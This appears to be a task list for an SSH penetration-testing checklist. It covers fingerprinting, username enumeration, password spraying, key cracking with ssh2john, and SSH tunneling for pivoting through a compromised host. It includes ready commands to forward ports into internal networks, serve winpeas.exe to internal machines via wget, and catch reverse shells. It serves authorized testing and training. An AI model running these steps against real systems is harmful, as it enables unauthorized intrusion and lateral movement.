tasks.title: Banner Grabbing & Fingerprinting
tasks.description: Identify the exact OpenSSH version and underlying OS distribution.

tasks.title: Weak Ciphers & Algorithms Check
tasks.description: Enumerate supported algorithms to find deprecated or vulnerable ciphers.

tasks.title: Username Enumeration
tasks.description: Attempt to enumerate valid usernames if older OpenSSH versions (<= 7.7) are in use.

tasks.title: Password Spray & Brute-Force
tasks.description: Test weak passwords against known user accounts.

tasks.title: Private Key Setup & Cracking
tasks.description: If a key is found, chmod 600 before use. If encrypted, use ssh2john to convert and crack it.

tasks.title: Pivoting: Dynamic Forwarding (-D)
tasks.description:
**The Goal:** Turn your Kali machine into a router for the internal network to use proxychains.

**The Command:** `ssh -N -f -D <Kali_Port> <user>@<Compromised_IP>`
**Example:** `ssh -N -f -D 1080 admin@{target_ip}`

**How it works:**
* `1080`: Port that opens locally on your Kali machine.
* `admin@{target_ip}`: The pivot machine you are logging into.

**The Result:** Update `/etc/proxychains4.conf` to `socks5 127.0.0.1 1080`. You can now run `proxychains nmap <Internal_IP>`.

tasks.title: Pivoting: Local Forwarding (-L)
tasks.description:
**The Goal:** Bring a single port from deep inside the network and attach it to your Kali machine (e.g., viewing an internal web server).

**The Command:** `ssh -N -f -L <Kali_Port>:<Target_IP>:<Target_Port> <user>@<Compromised_IP>`
**Example:** `ssh -N -f -L 9000:172.16.50.10:80 admin@{target_ip}`

**How it works:**
* `9000`: Port that opens on your Kali machine.
* `172.16.50.10:80`: The internal IP/Port you want to reach (use 127.0.0.1 if it's local to the pivot box).
* `admin@{target_ip}`: The pivot machine you are logging into.

**The Result:** Navigate to `http://127.0.0.1:9000` on your Kali browser to see the internal site.

tasks.title: Pivoting: Reverse Forwarding (-R)
tasks.description:
**The Goal:** Send a port from your Kali machine into the compromised network. Critical for serving files (like winpeas) or catching reverse shells on deeply internal machines.

**The Command:** `ssh -N -f -R <Compromised_Port>:<Kali_IP>:<Kali_Port> <user>@<Compromised_IP>`
**Example:** `ssh -N -f -R 8080:127.0.0.1:80 admin@{target_ip}`

**How it works:**
* `8080`: Port that opens on the compromised machine.
* `127.0.0.1:80`: Points to the Python web server running on your Kali machine.
* `admin@{target_ip}`: The pivot machine you are logging into.

**The Result:** Anyone on the internal network can now run `wget http://{target_ip}:8080/winpeas.exe`, tunneling traffic back to your Kali port 80.
